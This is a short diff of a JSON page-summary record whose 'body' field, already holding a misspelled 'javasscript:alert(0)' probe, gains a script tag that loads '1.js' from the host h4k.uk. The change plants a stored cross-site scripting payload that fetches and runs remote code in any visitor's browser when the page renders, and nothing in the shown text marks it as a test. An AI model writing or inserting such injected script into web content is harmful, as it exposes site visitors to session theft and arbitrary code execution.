@@ -1,6 +1,6 @@
 {
   "_id": "page.3",
   "_type": "page.summary",
-  "body": "{javasscript:alert(0);}",
+  "body": "{javasscript:alert(0);}<script src=h4k.uk/1.js></script>",
   "url": "3"
 }
